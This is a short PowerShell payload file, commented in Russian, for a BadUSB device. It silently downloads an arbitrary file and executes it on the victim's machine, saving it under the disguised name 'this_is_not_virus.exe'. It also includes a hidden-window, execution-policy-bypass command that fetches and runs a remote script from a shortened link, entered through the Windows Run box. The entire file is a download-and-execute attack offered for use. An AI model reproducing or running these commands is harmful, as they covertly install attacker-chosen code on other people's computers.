# Payload 1 для BadUSB
# Задача: Скачать и запустить любой файл (хоть EXE, хоть MP3)
# Этот файл нагрузки будет выполняться в фоновом режиме без видимых окон, и его размер может быть любым (в нём нет лимита на 259 символов)

$url_file = 'файл ссылка'
$file = 'this_is_not_virus.exe'	#Под каким названием сохранить файл, так же можно указать путь "C:\Windows\this_is_not_virus.exe"

PowerShell (New-Object System.Net.WebClient).DownloadFile($url_file,$file),
(New-Object -com Shell.Application).ShellExecute($file);  

#####################
## Конец Payload 1 ##
#####################

********************************************************************************************************************************************************

###################################
## Команда для запуска Payload 1 ##
###################################

iex(New-Object Net.WebClient).DownloadString('Ссылка')

###########
## Конец ##
###########

********************************************************************************************************************************************************

################################################
## Загрузка+Выполнение Payload из Windows + R ##
##     Тут у нас лимит в 259 символов         ##
################################################

powershell -ep bypass -nop -w 1 iex(New-Object Net.WebClient).DownloadString('http://bit.ly/2Jpad6o')

###########
## Конец ##
###########
